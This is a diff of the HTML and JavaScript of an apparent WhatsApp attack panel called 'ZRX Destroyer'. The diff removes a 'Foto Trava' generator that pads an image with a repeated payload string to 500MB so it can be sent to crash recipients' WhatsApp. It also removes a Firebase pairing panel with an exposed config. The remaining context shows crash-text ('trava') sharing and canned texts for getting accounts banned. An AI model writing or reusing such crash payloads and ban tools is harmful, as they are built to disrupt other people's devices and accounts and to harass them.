@@ -322,26 +322,6 @@
             left: 3px;
             box-shadow: 0 7px 0 #38bdf8;
         }
-        .symbol-balloon::before {
-            content: '';
-            position: absolute;
-            width: 14px;
-            height: 12px;
-            border: 2px solid #38bdf8;
-            border-radius: 4px;
-            top: 3px;
-            left: 3px;
-        }
-        .symbol-balloon::after {
-            content: '';
-            position: absolute;
-            width: 4px;
-            height: 4px;
-            background: #38bdf8;
-            bottom: 2px;
-            left: 6px;
-            transform: rotate(45deg);
-        }
         .symbol-shield::before {
             content: '';
             position: absolute;
@@ -351,16 +331,6 @@
             clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
             top: 3px;
             left: 4px;
-        }
-        .symbol-cloud::before {
-            content: '';
-            position: absolute;
-            width: 14px;
-            height: 10px;
-            background: #22c55e;
-            border-radius: 5px;
-            top: 5px;
-            left: 3px;
         }
 
         .card-content-bottom {
@@ -538,26 +508,6 @@
             background: rgba(239, 68, 68, 0.08);
         }
 
-        /* Preview Canvas Container */
-        .canvas-preview-box {
-            width: 100%;
-            height: 200px;
-            background: #0f172a;
-            border: 1px dashed #334155;
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-            position: relative;
-        }
-
-        .canvas-preview-box img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-        }
-
         input[type="file"] {
             display: none;
         }
@@ -649,18 +599,6 @@
                     </div>
                 </div>
 
-                <!-- Balão 4: Criador de Foto Trava 500MB -->
-                <div class="carousel-card" onclick="openModal('modalFotoTrava')">
-                    <div class="card-header-top">
-                        <span class="card-tag">FOTO 500MB</span>
-                        <span class="css-symbol symbol-balloon"></span>
-                    </div>
-                    <div class="card-content-bottom">
-                        <div class="card-label">Foto Trava ZAP</div>
-                        <div class="card-desc">Modificar arquivo até 500MB</div>
-                    </div>
-                </div>
-
                 <!-- Balão 5: Central de Banimento Jurídico -->
                 <div class="carousel-card" onclick="openModal('modalCentralBan')">
                     <div class="card-header-top">
@@ -670,18 +608,6 @@
                     <div class="card-content-bottom">
                         <div class="card-label">Central Banimento</div>
                         <div class="card-desc">Textos oficiais jurídicos p/ suporte</div>
-                    </div>
-                </div>
-
-                <!-- Balão 6: Pareamento Firebase (NOVO) -->
-                <div class="carousel-card" onclick="openModal('modalPareamentoFirebase')">
-                    <div class="card-header-top">
-                        <span class="card-tag" style="color: #22c55e; background: rgba(34,197,94,0.12);">FIREBASE</span>
-                        <span class="css-symbol symbol-cloud"></span>
-                    </div>
-                    <div class="card-content-bottom">
-                        <div class="card-label">Pareamento BD</div>
-                        <div class="card-desc">Código 8 dígitos e gerenciar número</div>
                     </div>
                 </div>
 
@@ -796,42 +722,6 @@
         </div>
     </div>
 
-    <!-- MODAL 4: FOTO TRAVA ZAP (ATÉ 500MB) -->
-    <div class="modal-overlay" id="modalFotoTrava">
-        <div class="modal-content" style="max-width: 450px;">
-            <div class="modal-header">
-                <div class="modal-title">Modificador de Foto Trava ZAP (Até 500MB)</div>
-                <button class="modal-close" onclick="closeModal('modalFotoTrava')">&times;</button>
-            </div>
-            
-            <div class="form-group">
-                <label class="form-label">1. Escolha a Imagem Base</label>
-                <button class="action-btn" style="background: #334155; font-size: 0.85rem; padding: 10px;" onclick="document.getElementById('inputBaseImg').click()">Selecionar Imagem</button>
-            </div>
-            <input type="file" id="inputBaseImg" accept="image/*" onchange="carregarImagemBase(event)">
-
-            <div class="canvas-preview-box" id="canvasPreviewBox">
-                <span style="color: #64748b; font-size: 0.75rem; text-align: center; padding: 10px;">Nenhuma imagem carregada</span>
-            </div>
-
-            <div class="form-group">
-                <label class="form-label">2. Escolha o Peso Modificado (Limite Máx: 500MB)</label>
-                <select class="form-select" id="selectPesoTrava">
-                    <option value="100">100 MB (Leve / Rápido)</option>
-                    <option value="250">250 MB (Médio)</option>
-                    <option value="500" selected>500 MB (Limite Máximo / WhatsApp & Business)</option>
-                </select>
-            </div>
-
-            <div class="counter-badge" id="pesoEstimadoDisplay">Peso Alvo: 500 MB</div>
-
-            <div style="display: flex; gap: 10px; margin-top: 5px;">
-                <button class="action-btn" style="flex: 1;" onclick="baixarFotoPesada()">Gerar e Baixar Foto 500MB</button>
-                <button class="action-btn" style="flex: 1; background: linear-gradient(135deg, #22c55e, #16a34a);" onclick="compartilharFotoPesadaWp()">Enviar no WhatsApp</button>
-            </div>
-        </div>
-    </div>
-
     <!-- MODAL 5: CENTRAL DE BANIMENTO JURÍDICO -->
     <div class="modal-overlay" id="modalCentralBan">
         <div class="modal-content" style="max-width: 450px;">
@@ -864,129 +754,6 @@
             <button class="action-btn" onclick="copiarTextoBanimento()">Copiar Texto</button>
         </div>
     </div>
-
-    <!-- MODAL 6: PAREAMENTO FIREBASE (CÓDIGO 8 DÍGITOS REAIS, ADICIONAR E DELETAR NÚMERO) -->
-    <div class="modal-overlay" id="modalPareamentoFirebase">
-        <div class="modal-content" style="max-width: 450px;">
-            <div class="modal-header">
-                <div class="modal-title">Pareamento & Gestão Firebase</div>
-                <button class="modal-close" onclick="closeModal('modalPareamentoFirebase')">&times;</button>
-            </div>
-
-            <!-- Bloco de Geração do Código de 8 Dígitos -->
-            <div class="form-group">
-                <label class="form-label">1. Código de Pareamento (8 Dígitos)</label>
-                <div class="counter-badge" style="font-size: 1.3rem; letter-spacing: 2px; padding: 12px; background: #0f172a;" id="displayCodigoPareamento">--------</div>
-            </div>
-            <button class="action-btn" onclick="window.iniciarSessaoPareamento()">Gerar Novo Código Firebase</button>
-
-            <hr style="border: 0; border-top: 1px solid #334155; margin: 4px 0;">
-
-            <!-- Bloco para Adicionar Número -->
-            <div class="form-group">
-                <label class="form-label">2. Cadastrar / Salvar Número no Banco</label>
-                <input type="text" class="form-input" id="inputNumeroSalvarBD" placeholder="Ex: 5511999999999">
-            </div>
-            <button class="action-btn" style="background: linear-gradient(135deg, #22c55e, #16a34a);" onclick="window.salvarNumeroNoFirestore()">Salvar Número no Banco</button>
-
-            <!-- Bloco para Deletar Número -->
-            <div class="form-group" style="margin-top: 5px;">
-                <label class="form-label">3. Deletar Número do Banco</label>
-                <input type="text" class="form-input" id="inputNumeroDeletarBD" placeholder="Ex: 5511999999999">
-            </div>
-            <button class="action-btn" style="background: linear-gradient(135deg, #ef4444, #dc2626);" onclick="window.deletarNumeroDoFirestore()">Deletar Número do Banco</button>
-        </div>
-    </div>
-
-
-    <!-- SCRIPTS FIREBASE E LÓGICA DO PAINEL -->
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getFirestore, doc, setDoc, deleteDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
-
-        const firebaseConfig = {
-            apiKey: "AIzaSyAxVV73hiMlKeF0FMRM_ISklIv5qViOAmE",
-            authDomain: "zrx-destroyer-7da8a.firebaseapp.com",
-            projectId: "zrx-destroyer-7da8a",
-            storageBucket: "zrx-destroyer-7da8a.firebasestorage.app",
-            messagingSenderId: "157750091270",
-            appId: "1:157750091270:web:d6f633da69d83b87dc2d87",
-            measurementId: "G-L7RZJ497G7"
-        };
-
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-
-        // Função global de Gerar Código de 8 Dígitos e Salvar no Firestore
-        window.iniciarSessaoPareamento = async function() {
-            const codigoUnico = Math.floor(10000000 + Math.random() * 90000000).toString();
-            
-            const display = document.getElementById("displayCodigoPareamento");
-            if(display) display.innerText = codigoUnico;
-
-            try {
-                await setDoc(doc(db, "sessoes_pareamento", codigoUnico), {
-                    status: "pendente",
-                    criadoEm: new Date().toISOString()
-                });
-                alert("Código de 8 dígitos gerado e salvo no Firestore com sucesso!");
-            } catch (erro) {
-                console.error("Erro ao salvar no Firestore:", erro);
-                alert("Erro ao salvar no banco. Verifique o console.");
-            }
-
-            const refDoc = doc(db, "sessoes_pareamento", codigoUnico);
-            const unsubscribe = onSnapshot(refDoc, (docSnap) => {
-                if (docSnap.exists()) {
-                    const dados = docSnap.data();
-                    if (dados.status === "conectado") {
-                        alert("Dispositivo pareado com sucesso!");
-                        closeModal('modalPareamentoFirebase');
-                        unsubscribe();
-                    }
-                }
-            });
-        }
-
-        // Função para Adicionar/Salvar Número no Firestore
-        window.salvarNumeroNoFirestore = async function() {
-            const numero = document.getElementById("inputNumeroSalvarBD").value.trim();
-            if(!numero) {
-                alert("Digite o número que deseja salvar!");
-                return;
-            }
-
-            try {
-                await setDoc(doc(db, "numeros_autorizados", numero), {
-                    numero: numero,
-                    cadastradoEm: new Date().toISOString()
-                });
-                alert(`Número ${numero} salvo no Firestore com sucesso!`);
-                document.getElementById("inputNumeroSalvarBD").value = "";
-            } catch (erro) {
-                console.error("Erro ao salvar número:", erro);
-                alert("Erro ao salvar o número no banco.");
-            }
-        }
-
-        // Função para Deletar Número do Firestore
-        window.deletarNumeroDoFirestore = async function() {
-            const numero = document.getElementById("inputNumeroDeletarBD").value.trim();
-            if(!numero) {
-                alert("Digite o número que deseja deletar!");
-                return;
-            }
-
-            try {
-                await deleteDoc(doc(db, "numeros_autorizados", numero));
-                alert(`Número ${numero} deletado do Firestore com sucesso!`);
-                document.getElementById("inputNumeroDeletarBD").value = "";
-            } catch (erro) {
-                console.error("Erro ao deletar número:", erro);
-                alert("Erro ao deletar o número do banco.");
-            }
-        }
-    </script>
 
     <script>
         window.addEventListener('DOMContentLoaded', () => {
@@ -1206,73 +973,6 @@
         function compartilharWhatsAppTrava() {
             if(!travaSelecionadaAtual) return;
             window.open(`https://api.whatsapp.com/send?text=${encodeURIComponent(travaSelecionadaAtual.conteudo)}`, '_blank');
-        }
-
-        let arquivoImagemOriginal = null;
-        let blobFinalModificado = null;
-
-        function carregarImagemBase(event) {
-            const file = event.target.files[0];
-            if (!file) return;
-            arquivoImagemOriginal = file;
-            
-            const reader = new FileReader();
-            reader.onload = function(e) {
-                document.getElementById('canvasPreviewBox').innerHTML = `<img src="${e.target.result}" style="width:100%; height:100%; object-fit:contain;">`;
-                atualizarDisplayPeso();
-            };
-            reader.readAsDataURL(file);
-        }
-
-        document.getElementById('selectPesoTrava').addEventListener('change', atualizarDisplayPeso);
-
-        function atualizarDisplayPeso() {
-            const mb = parseInt(document.getElementById('selectPesoTrava').value) || 500;
-            document.getElementById('pesoEstimadoDisplay').innerText = `Peso Alvo: ${mb} MB`;
-        }
-
-        async function baixarFotoPesada() {
-            if (!arquivoImagemOriginal) { alert('Selecione uma imagem primeiro!'); return; }
-
-            const megabytes = parseInt(document.getElementById('selectPesoTrava').value) || 500;
-            const tamanhoAlvoBytes = megabytes * 1024 * 1024;
-
-            alert(`Modificando arquivo da foto para ${megabytes}MB... Compatível com WhatsApp e WhatsApp Business.`);
-
-            const arrayBufferOriginal = await arquivoImagemOriginal.arrayBuffer();
-            const stringPesada = "ZRX_DESTROYER_V5_500MB_PAYLOAD_⚠️💥💀🔥⚡_".repeat(100000);
-            const encoder = new TextEncoder();
-            const chunkExtra = encoder.encode(stringPesada);
-
-            const partes = [arrayBufferOriginal];
-            let tamanhoAtual = arrayBufferOriginal.byteLength;
-
-            while (tamanhoAtual < tamanhoAlvoBytes) {
-                partes.push(chunkExtra);
-                tamanhoAtual += chunkExtra.byteLength;
-            }
-
-            blobFinalModificado = new Blob(partes, { type: arquivoImagemOriginal.type });
-            
-            const url = URL.createObjectURL(blobFinalModificado);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `ZRX_Foto_Trava_${megabytes}MB.png`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-            
-            alert('Foto modificada com sucesso e baixada!');
-        }
-
-        function compartilharFotoPesadaWp() {
-            if (!blobFinalModificado) { 
-                baixarFotoPesada();
-                return; 
-            }
-            alert('Arquivo gerado! Abra o WhatsApp ou WhatsApp Business e envie o arquivo baixado.');
-            window.open('https://api.whatsapp.com/', '_blank');
         }
 
         const textosBanimentoBase = {
